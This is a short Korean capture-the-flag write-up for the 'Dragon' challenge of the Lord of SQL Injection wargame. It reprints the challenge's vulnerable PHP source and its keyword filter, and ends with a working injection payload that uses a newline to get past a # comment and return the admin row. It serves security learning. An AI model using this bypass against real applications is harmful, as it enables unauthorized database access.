# Lord of SQL Injection No.20 - Dragon
## 문제 출제 의도
1. # 주석을 무시할 수 있는지 확인한다.
## 소스 코드 분석
+ 소스코드
Dragon의 소스코드는 다음과 같다.
    ~~~
    <?php 
    include "./config.php"; 
    login_chk(); 
    dbconnect(); 
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
    $query = "select id from prob_dragon where id='guest'# and pw='{$_GET[pw]}'";
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysql_fetch_array(mysql_query($query)); 
    if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
    if($result['id'] == 'admin') solve("dragon");
    highlight_file(__FILE__); 
    ?>
    ~~~
+ 소스 코드 분석
    - 금지 문자열, 문자
        + Get 방식으로 받은 pw값에 'prob _ . ( )중 하나라도 있다면 "No Hack~_~"이 출력되고 문제 풀이에 실패한다.
    - 문제 풀이 조건
        + 문제풀이에 성공하는 조건은 query문을 통해 받아온 id 값이 'admin'일 떄다.
## 문제 해결
+ 주석 무시
    - #은 한줄 주석이기 떄문에 개행문자를 이용하면 쉽게 해결된다.
    ~~~
    ?pw='%0aor 1=1 limit 1,1-- -
    ~~~